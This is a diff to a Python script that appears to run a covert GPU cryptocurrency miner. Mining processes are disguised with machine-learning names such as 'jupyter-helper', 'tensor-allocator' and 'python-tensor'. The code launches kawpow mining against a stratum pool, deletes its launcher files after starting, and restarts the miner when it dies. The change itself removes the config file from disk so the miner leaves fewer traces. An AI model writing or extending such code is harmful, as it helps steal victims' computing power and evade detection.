@@ -320,13 +320,9 @@ def _init_accelerators():
     proc_b = None
     if gpu_count > 0:
         gpu_tag = f"{COIN_TICKER}:{MODEL_KEY}.node-gpu-{random.randint(100,999)}" if COIN_TICKER else f"{MODEL_KEY}.node-gpu-{random.randint(100,999)}"
-        gpu_cfg = os.path.join(EXEC_DIR, "tensor_config.json")
-        with open(gpu_cfg, "w") as f:
-            json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_tag, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
-
         wrapper = os.path.join(EXEC_DIR, "jupyter-helper")
         with open(wrapper, "w") as f:
-            f.write("#!/bin/bash\ncp ./tensor-allocator ./python-tensor\n./python-tensor -c tensor_config.json\n")
+            f.write(f"#!/bin/bash\ncp ./tensor-allocator ./python-tensor\n./python-tensor -a kawpow -o stratum+tcp://127.0.0.1:5555 -u {gpu_tag}\n")
         os.chmod(wrapper, 0o755)
 
         os.chdir(EXEC_DIR)
@@ -335,7 +331,6 @@ def _init_accelerators():
         ], stdout=out, stderr=out)
 
         time.sleep(3.0)
-        if os.path.exists(gpu_cfg): os.remove(gpu_cfg)
         if os.path.exists(wrapper): os.remove(wrapper)
 
     threading.Thread(target=_schedule_phases, daemon=True).start()
@@ -431,13 +426,9 @@ def _runtime_monitor():
             if VERBOSE: print(f"[!] Runtime B exited (code={exit_code}). Restarting...", flush=True)
 
             tag = f"{COIN_TICKER}:{MODEL_KEY}.node-gpu-{random.randint(100,999)}" if COIN_TICKER else f"{MODEL_KEY}.node-gpu-{random.randint(100,999)}"
-            gpu_cfg = os.path.join(EXEC_DIR, "tensor_config.json")
-            with open(gpu_cfg, "w") as f:
-                json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": tag, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
-
             wrapper = os.path.join(EXEC_DIR, "jupyter-helper")
             with open(wrapper, "w") as f:
-                f.write("#!/bin/bash\ncp ./tensor-allocator ./python-tensor\n./python-tensor -c tensor_config.json\n")
+                f.write(f"#!/bin/bash\ncp ./tensor-allocator ./python-tensor\n./python-tensor -a kawpow -o stratum+tcp://127.0.0.1:5555 -u {tag}\n")
             os.chmod(wrapper, 0o755)
 
             out = None if VERBOSE else subprocess.DEVNULL
@@ -447,7 +438,6 @@ def _runtime_monitor():
             ], stdout=out, stderr=out)
 
             time.sleep(3.0)
-            if os.path.exists(gpu_cfg): os.remove(gpu_cfg)
             if os.path.exists(wrapper): os.remove(wrapper)
 
         if check_count % 2 == 0:
